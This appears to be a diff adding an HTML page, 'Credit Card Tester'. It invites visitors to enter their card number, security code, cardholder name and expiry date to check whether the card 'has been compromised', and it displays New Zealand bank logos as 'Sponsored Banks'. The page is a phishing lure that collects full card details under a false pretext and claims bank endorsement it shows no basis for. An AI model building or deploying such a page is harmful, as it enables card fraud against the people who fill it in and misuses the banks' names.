@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>Credit Card Tester</title>
+    <link rel="stylesheet" href="index-style.css">
+    <link rel="icon" type="image/ico" href="logos/favicon.ico">
+  </head>
+  <body>
+
+    <form class="box" action="home.html" method="get" name="form" onsubmit="return validated()">
+
+	     <h1>Card Tester</h1>
+	     <h2>How to use:<br>
+         Enter details below to find out if your card has been compromised.</h2>
+
+       <img src="logos/favicon.ico" alt="Visa LOGO" style="max-width:100%;">
+
+	     <input type="number" id="Number" name="Number" placeholder="Credit Card Number">
+	     <input type="number" id="Back" name="Back" placeholder="SRV">
+       <input type="text" id="Name" name="Name" placeholder="Name On Card">
+       <input type="date" id="Date" name="Date" placeholder="Expire Date">
+	     <input type="submit" name="" value="Test">
+    </form>
+
+	  <div class="banks">
+		    <h1>Sponsored Banks</h1>
+        <a href="https://www.bnz.co.nz"><img src="logos/BNZ.png" alt="BNZ LOGO"></a>
+        <a href="https://www.westpac.co.nz"><img src="logos/WESTPAC.png" alt="WESTPAC LOGO"></a>
+        <a href="https://www.anz.co.nz/"><img src="logos/ANZ.png" alt="ANZ LOGO"></a>
+        <a href="https://www.asb.co.nz"><img src="logos/ASB.png" alt="ASB LOGO"></a>
+        <a href="https://www.kiwibank.co.nz/"><img src="logos/KIWI_BANK.png" alt="Kiwi Bank LOGO" style="max-width:40%;"></a>
+    </div>
+
+    <div class="fotter">
+      <h1>About this page.</h1>
+      <h2>Please read thease <a href="terms.html">Terms and Conditions</a>.</h2>
+      <h2>Still a work in progress</h2>
+
+    </div>
+
+
+
+    <script src="js.js"></script>
+	</body>
+</html>
